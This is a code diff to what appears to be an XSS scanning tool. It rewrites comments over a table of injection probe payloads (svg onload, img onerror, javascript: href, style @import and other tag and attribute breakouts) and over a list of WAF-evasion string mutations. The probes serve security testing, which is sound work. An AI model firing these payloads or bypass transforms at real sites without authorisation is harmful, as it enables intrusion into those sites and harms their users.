@@ -77,9 +77,9 @@ ATTR_MARK = '"'           # a bare double-quote surviving raw = attribute breako
 # v3.10: payload variants for context-aware probing.
 # Each variant is (suffix_appended_to_cid, marker_that_must_survive_raw).
 # `suffix` is what gets sent; `marker` is what verdict() looks for AFTER cid.
-# The historical default `body` is the same shape as make_canary() was: an
-# attribute-quote followed by a benign tag. The others are payloads tuned to
-# a specific reflection context that the v3.5 sink-context detector labels.
+# These are historical marker-probe strings grouped by intended context.
+# Names and raw marker survival are not parser, execution, or vulnerability
+# evidence; several use literal `1` values rather than executable canaries.
 PAYLOAD_VARIANTS = {
     # v3.10 base five: attribute breakout + close-tag families.
     "body":            ('"<dXsS>',                '<dXsS>'),
@@ -88,12 +88,8 @@ PAYLOAD_VARIANTS = {
     "script-breakout": ("';<dXsS>//",             '<dXsS>'),
     "url-scheme":      ('javascript:/*<dXsS>*/',  'javascript:/*<dXsS>*/'),
 
-    # Phase 1.2 additions: event-handler tags (the most common real-world
-    # XSS execution vectors). Each is a fully-formed HTML tag that runs an
-    # attribute handler in a browser. The marker embeds the tag so the
-    # verdict fires only if the tag itself survived raw, not just the
-    # `<dXsS>` grep-marker after it. All names end in `-breakout` so
-    # Raw markers establish reflection only; variant names cannot prove execution.
+    # Historical event-handler-shaped probes. The literal handler values and
+    # raw response check do not establish an event, callback, or execution.
     "svg-breakout":            ('"><svg onload=1><dXsS>',
                                 '<svg onload=1><dXsS>'),
     "img-breakout":            ('"><img src=x onerror=1><dXsS>',
@@ -170,26 +166,26 @@ PAYLOAD_VARIANTS = {
         '"><iframe src=data:text/html,<dXsS>>',
         '<iframe src=data:text/html,<dXsS>>',
     ),
-    # JS double-quoted string escape. Complements script-breakout (which is
-    # single-quoted). Together they cover both string-quote conventions.
+    # Historical JavaScript-string-shaped probe; the suffix alone does not
+    # establish a parser context or a valid executable statement.
     "js-double-string-breakout": (
         '";<dXsS>//',
         '<dXsS>',
     ),
-    # javascript: href on anchor. Extremely common in real targets; users
-    # click, alert fires.
+    # Historical href-shaped probe. It contains no executable canary and
+    # does not establish navigation or click behavior.
     "anchor-href-javascript-breakout": (
         '"><a href=javascript:1><dXsS></a>',
         '<a href=javascript:1><dXsS></a>',
     ),
-    # <noscript> context. Some sanitizers do NOT parse noscript children
-    # (because scripting is assumed on) so injected content leaks in.
+    # Historical noscript-context hypothesis; sanitizer and parser behavior
+    # requires observation against a named target and configuration.
     "noscript-breakout": (
         '"><noscript><p title="</noscript><dXsS>',
         '</noscript><dXsS>',
     ),
-    # <style> block. CSS injection surface -- @import can pull external
-    # payload, but even without it the tag survival proves the escape.
+    # Historical style-context probe; returned marker bytes do not prove a
+    # CSS interpretation, parser escape, or external request.
     "style-tag-breakout": (
         '"><style>@import url(<dXsS>)</style>',
         '<style>@import url(<dXsS>)</style>',
@@ -223,10 +219,8 @@ PAYLOAD_VARIANTS = {
         '<dialog open oncancel=1><dXsS></dialog>',
     ),
 
-    # Attribute-list injection. Stays INSIDE the current tag by opening one
-    # attribute and appending a handler + a swallow-comment. Different
-    # mechanism from attr-breakout (which escapes the tag entirely) - many
-    # sanitizers block `>` but allow bare `"`.
+    # Historical attribute-list shapes; actual attribute placement and
+    # sanitizer behavior depend on the complete returned document.
     "attr-inject-onerror-breakout": (
         '" onerror=1//',
         '" onerror=1//',
@@ -236,9 +230,8 @@ PAYLOAD_VARIANTS = {
         '" onmouseover=1//',
     ),
 
-    # URL-context tags that hijack navigation. `<base href=javascript:>`
-    # rewrites every subsequent relative URL. `<meta http-equiv=refresh>`
-    # navigates automatically.
+    # Historical URL-context probes. The strings alone do not establish a
+    # parsed URL, navigation, or browser execution.
     "base-href-javascript-breakout": (
         '"><base href=javascript:1//><dXsS>',
         '<base href=javascript:1//><dXsS>',
@@ -261,9 +254,8 @@ PAYLOAD_VARIANTS = {
         '<audio><source onerror=1></audio><dXsS>',
     ),
 
-    # Legacy tags still parsed by every mainstream browser. Some allowlist
-    # sanitizers explicitly bless <xmp> as "safe pre-formatted text",
-    # forgetting that anything AFTER </xmp> re-enters normal parsing.
+    # Historical xmp-context hypothesis; browser and sanitizer handling must
+    # be checked in the full target document.
     "xmp-breakout": (
         '</xmp><dXsS>',
         '</xmp><dXsS>',
@@ -334,32 +326,28 @@ PAYLOAD_VARIANTS = {
 }
 
 
-# WAF-bypass mutations. Each takes the base variant's canary + marker and
-# returns an alternate shape that keeps the same `cid` prefix. The idea: if
-# the base payload is blocked by a regex WAF (rules that match <dXsS> or
-# <script literal etc.), one of these variants may still slip through by
-# obfuscating the parts the WAF pattern anchored on.
-#
-# Every mutation must produce a shape that (a) a lenient HTML parser
-# re-forms into the intended tag and (b) transforms both the sent canary
-# and the verdict marker identically, so verdict() still finds it in the
-# response body.
+# Historical mutation registry. These string transforms were proposed to
+# vary marker spelling and preserve CID matching. Their names and presence in
+# a response do not prove WAF bypass, HTML parser recovery, DOM sink delivery,
+# or browser execution. Validate each claim separately in the actual target.
+# CID and verdict-marker transforms stay paired so raw-reflection comparison
+# can identify a returned marker; that comparison does not establish parsing.
 _WAF_MUTATIONS = [
     # (name, marker_transform) -- both sides get the same replacement
-    # v3.10 originals:
+    # Historical v3.10 transforms; not validated execution probes:
     ("case",              lambda s: s.replace('<dXsS>', '<DxSs>')),
-    ("split-cmt",         lambda s: s.replace('<dXsS>', '<d<!---->XsS>')),   # comment splits the tag; parser re-forms
+    ("split-cmt",         lambda s: s.replace('<dXsS>', '<d<!---->XsS>')),   # Proposed split-comment shape; parser recovery is not established.
     ("whitespace",        lambda s: s.replace('<dXsS>', '<dXsS  >')),
     ("url-encode",        lambda s: s.replace('<dXsS>', '%3CdXsS%3E')),
 
     # Phase 1.2 additions:
-    # HTML5 permits tab/newline as whitespace inside a tag; many regex WAFs
-    # look only for `<[A-Za-z]+ ` (space) after the tag name.
+    # Historical whitespace variations; a target's parser/WAF behavior must
+    # be observed independently before describing any bypass.
     ("tab-in-tag",        lambda s: s.replace('<dXsS>', '<dXsS\t>')),
     ("newline-in-tag",    lambda s: s.replace('<dXsS>', '<dXsS\n>')),
 
-    # `<tag/attr=…>` is valid HTML5 — the slash is legal whitespace-like
-    # separator. Slips regex WAFs anchored on space.
+    # Historical slash variation; a string transform alone establishes no
+    # parser behavior or WAF bypass.
     ("slash-separator",   lambda s: s.replace('<dXsS>', '<dXsS/>')),
 
     # Double URL-encode. If the intermediary decodes once and the backend
